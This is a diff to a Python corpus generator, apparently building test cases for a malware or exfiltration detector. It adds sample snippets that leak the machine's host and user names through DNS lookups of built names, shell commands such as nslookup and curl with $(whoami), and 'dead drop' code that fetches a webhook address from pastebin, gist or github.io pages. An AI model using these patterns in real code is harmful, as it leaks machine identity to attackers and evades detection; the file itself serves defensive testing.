@@ -288,6 +288,19 @@ EXFIL = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{",
          "'/bin/sh'", "env = dict(os.environ)", "urlencode(env)", "const e = {...process.env}", "JSON.stringify(e)",
          "'203.0.113.5'", "sock.connect((ip, 80))", "'8.8.8.8'", _XMR, "'-o'", "stratum+tcp://pool.invalid:3333",
          "subprocess.Popen(", "CreateShortcut", "--load-extension=x", ".lnk", "\U0001F600", "\u00e9"]
+# (0.1.8) DNS names built outside a template, in a name, in a shell command; dead drops; the host name
+# read through require('os') and imports (an alphabet of its own: the one above keeps its odds)
+EXFIL_MORE = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", "/", ".", "\\",
+              "dns.lookup(", "socket.gethostbyname(", "h + '.x.invalid.com'", "'%s.x.invalid.com' % h",
+              "'{}.x.invalid.com'.format(h)", "q = h + '.u.x.invalid.com'\n", "lookup(q)", "h + '.local'", "nslookup ",
+              "dig ", "ping -c1 ", "$(whoami).x.invalid.com", "`hostname`.x.invalid.com", "%USERNAME%.x.invalid.com",
+              "$USER.x.invalid.com", "curl http://", "os.system('nslookup ' + h + '.x.invalid.com')",
+              "require('os').hostname()", "const { hostname } = require('os');", "from socket import gethostname\n",
+              "socket.gethostname()", "os.hostname()",
+              "cfg = requests.get('https://x.github.io/c.json').json()\n", "requests.post(cfg['url'], json=h)",
+              "fetch('https://x.github.io/c.json').then(r => r.json()).then(c => fetch(c.hook, {method: 'POST', body: h}))",
+              "for w in cfg['hooks']:\n    ", "urllib.request.Request(w, data=b)",
+              "with urlopen('https://x.github.io/c') as r:\n", "return cfg\n", "def load():\n    ", "\U0001F600"]
 EXFIL_REASONS = ("sends data to a Telegram bot whose token is written in the code",
                  "sends data to a Discord webhook whose token is written in the code",
                  "sends data to a Slack webhook whose key is written in the code",
@@ -295,6 +308,7 @@ EXFIL_REASONS = ("sends data to a Telegram bot whose token is written in the cod
                  "collects files from several credential folders and sends data over the network",
                  "sends the machine's user or host name to an address it hides in base64",
                  "sends the machine's user or host name in a DNS lookup of a name it builds",
+                 "sends the machine's user or host name to an address it fetches at run time",
                  "sends the machine's public IP address to a data-capture service", "runs a cryptocurrency miner",
                  "rewrites browser shortcuts to load an extension")
 EXFIL_CURATED = [
@@ -334,6 +348,64 @@ EXFIL_CURATED = [
     "import subprocess as _sub, sys as _sys\n_url = 'https://203.0.113.4/t.pyz'\n_dest = '/tmp/t.pyz'\n"
     "_sub.run(['curl', '-k', '-L', '-s', _url, '-o', _dest], timeout=15)\n"
     "_sub.Popen([_sys.executable, _dest], start_new_session=True)\n",
+    # (0.1.8) the DNS beacon's name built outside a template, in a name, in a shell command (and not:
+    # reserved names, a machine looking itself up, a path, an assignment)
+    "const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\ndns.lookup(h + '.u.x.invalid.com', cb);\n",
+    "const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.' + os.userInfo().username"
+    " + '.x.invalid.com';\ndns.lookup(q, () => {});\n",
+    "const os = require('os'), dns = require('dns');\nconst d = Buffer.from(os.hostname()).toString('hex');\n"
+    "for (const c of d.match(/.{1,60}/g)) { dns.resolve4(c + '.x.invalid.com', () => {}); }\n",
+    "import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n",
+    "import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n",
+    "import socket, getpass\nh = socket.gethostname()\nq = f'{h}.{getpass.getuser()}.x.invalid.com'\n"
+    "socket.getaddrinfo(q, 80)\n",
+    "import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n",
+    "import os, socket\nh = socket.gethostname()\nos.system(f'ping -c 1 {h}.x.invalid.com')\n",
+    "nslookup $(whoami).$(hostname).x.invalid.com",
+    "ping -c 1 `whoami`.x.invalid.com && echo ok",
+    "curl -s http://$(whoami).x.invalid.com/p",
+    "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com",
+    "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com",
+    "ping -c 1 $(hostname).local",
+    "host=$(hostname).x.invalid.com",
+    "curl -s http://x.invalid.com/$(whoami)",
+    "import socket\nip = socket.gethostbyname(socket.gethostname() + '.local')\n",
+    "import socket\nip = socket.gethostbyname(socket.gethostname())\n",
+    "const os = require('os'), dns = require('dns');\ndns.resolveSrv('_http._tcp.' + zone, cb);\nos.hostname();\n",
+    # (0.1.8) dead drops: the address fetched at run time (and not: a GET, a literal address, no literal fetch)
+    "import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
+    "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
+    "import requests, socket\nurl = requests.get('https://gist.githubusercontent.com/u/x/raw/c.txt').text.strip()\n"
+    "requests.post(url, data=socket.gethostname())\n",
+    "import json, socket, urllib.request as u\nwith u.urlopen('https://x.github.io/c.json') as r:\n    c = json.load(r)\n"
+    "u.urlopen(u.Request(c['hook'], data=socket.gethostname().encode()))\n",
+    "import json, socket, urllib.request\n_W = None\ndef hooks():\n    global _W\n"
+    "    req = urllib.request.Request('https://x.github.io/c.json')\n"
+    "    cfg = json.loads(urllib.request.urlopen(req).read())\n    _W = cfg.get('webhooks', [])\n    return _W\n"
+    "def send():\n    for w in hooks()[:2]:\n"
+    "        urllib.request.urlopen(urllib.request.Request(w, data=socket.gethostname().encode(), method='POST'))\n",
+    "const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => fetch(c.hook, "
+    "{ method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n",
+    "const os = require('os');\nasync function go() {\n  const res = await fetch('https://x.pages.dev/c.json');\n"
+    "  const c = await res.json();\n  await fetch(c.endpoint, { method: 'POST', body: os.hostname() });\n}\n",
+    "const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
+    "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, { h: os.hostname() }); })();\n",
+    "const os = require('os'), https = require('https');\nconst CFG = 'https://x.github.io/c.json';\n"
+    "https.get(CFG, (res) => { let b = ''; res.on('data', (d) => b += d); res.on('end', () => { "
+    "const c = JSON.parse(b); const r = https.request(c.url, { method: 'POST' }); r.write(os.hostname()); r.end(); }); });\n",
+    "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\nrequests.get(cfg['url'])\n"
+    "socket.gethostname()\n",
+    "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
+    "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
+    "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
+    "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
+    "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json()).then((j) => "
+    "{ if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n",
+    # (0.1.8) the host name read through require('os') and imports
+    "const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
+    "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
+    "const { hostname, platform } = require('os');\nfetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
+    "from socket import gethostname\nimport requests\nrequests.post('https://x.invalid/', data=gethostname())\n",
 ]
 # prose (0.1.7): comments, docstrings and strings standing alone, which the
 # import-time test reads out of a Python or JavaScript file, around exec calls
@@ -718,7 +790,7 @@ def corpus(seed=20260926, scale=1):
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
                                 (SELF, 1500, 14), (SELF_ASYNC, 2000, 12), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
-                                (EXFIL, 2500, 10), (SERVICES, 2500, 10), (XOR, 1500, 10)):
+                                (EXFIL, 2500, 10), (SERVICES, 2500, 10), (XOR, 1500, 10), (EXFIL_MORE, 2000, 10)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
